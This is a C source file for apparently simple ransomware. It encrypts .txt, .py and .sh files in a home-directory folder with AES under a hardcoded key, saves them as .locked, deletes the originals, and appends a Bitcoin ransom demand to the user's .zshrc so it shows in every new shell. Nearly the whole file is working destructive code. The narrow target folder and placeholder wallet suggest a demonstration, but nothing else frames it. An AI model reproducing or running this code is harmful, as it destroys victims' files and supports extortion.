#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/evp.h>

#define HARDCODED_KEY "my_super_secret_key!"
#define TARGET_EXTENSIONS ".txt,.py,.sh"
#define RANSOM_NOTE "======================================================\n\
             YOUR FILES ARE ENCRYPTED \n\
======================================================\n\
All your important files have been encrypted.\n\
To recover them, contact: your_mail@gmail.com\n\
and send $10000000 in Bitcoin to the following wallet:\n\
    1ABCDeFgHiJkLmNoPQRstUvWxYz1234567\n\
After payment, you will receive a decryption tool.\n\
======================================================\n"

void add_ransom_to_zshrc() {
    char *home = getenv("HOME");
    char zshrc_path[256];
    snprintf(zshrc_path, sizeof(zshrc_path), "%s/.zshrc", home);
    FILE *f = fopen(zshrc_path, "a");
    if (f != NULL) {
        fprintf(f, "\necho \"%s\"\n", RANSOM_NOTE);
        fclose(f);
    }
}

void encrypt_file(const char *file_path, EVP_CIPHER_CTX *ctx) {
    FILE *f = fopen(file_path, "rb");
    if (!f) return;

    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);
    fseek(f, 0, SEEK_SET);

    unsigned char *content = (unsigned char *)malloc(file_size);
    fread(content, 1, file_size, f);
    fclose(f);

    int padded_size = ((file_size / AES_BLOCK_SIZE) + 1) * AES_BLOCK_SIZE;
    unsigned char *padded_content = (unsigned char *)malloc(padded_size);
    memset(padded_content, 0, padded_size);
    memcpy(padded_content, content, file_size);

    unsigned char iv[AES_BLOCK_SIZE];
    if (!RAND_bytes(iv, AES_BLOCK_SIZE)) {
        free(content);
        free(padded_content);
        return;
    }

    unsigned char *encrypted_content = (unsigned char *)malloc(padded_size + AES_BLOCK_SIZE);
    memcpy(encrypted_content, iv, AES_BLOCK_SIZE);

    int len = 0;
    if (!EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, (unsigned char *)HARDCODED_KEY, iv)) {
        free(content);
        free(padded_content);
        free(encrypted_content);
        return;
    }

    if (!EVP_EncryptUpdate(ctx, encrypted_content + AES_BLOCK_SIZE, &len, padded_content, padded_size)) {
        free(content);
        free(padded_content);
        free(encrypted_content);
        return;
    }

    int ciphertext_len = len;
    if (!EVP_EncryptFinal_ex(ctx, encrypted_content + AES_BLOCK_SIZE + len, &len)) {
        free(content);
        free(padded_content);
        free(encrypted_content);
        return;
    }
    ciphertext_len += len;

    char encrypted_path[256];
    snprintf(encrypted_path, sizeof(encrypted_path), "%s.locked", file_path);
    FILE *enc_file = fopen(encrypted_path, "wb");
    if (enc_file != NULL) {
        fwrite(encrypted_content, 1, ciphertext_len + AES_BLOCK_SIZE, enc_file);
        fclose(enc_file);
    }

    remove(file_path);
    free(content);
    free(padded_content);
    free(encrypted_content);
}

void encrypt_secret_folder() {
    char *home = getenv("HOME");
    char target_folder[256];
    snprintf(target_folder, sizeof(target_folder), "%s/secret_folder", home);

    struct dirent *entry;
    DIR *dp = opendir(target_folder);
    if (dp == NULL) return;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (ctx == NULL) {
        closedir(dp);
        return;
    }

    while ((entry = readdir(dp)) != NULL) {
        char file_path[256];
        snprintf(file_path, sizeof(file_path), "%s/%s", target_folder, entry->d_name);

        struct stat st;
        if (stat(file_path, &st) == 0 && S_ISREG(st.st_mode)) {
            if (strstr(TARGET_EXTENSIONS, strrchr(entry->d_name, '.') + 1)) {
                encrypt_file(file_path, ctx);
            }
        }
    }

    EVP_CIPHER_CTX_free(ctx);
    closedir(dp);
}

int main() {
    encrypt_secret_folder();
    add_ransom_to_zshrc();
    return 0;
}
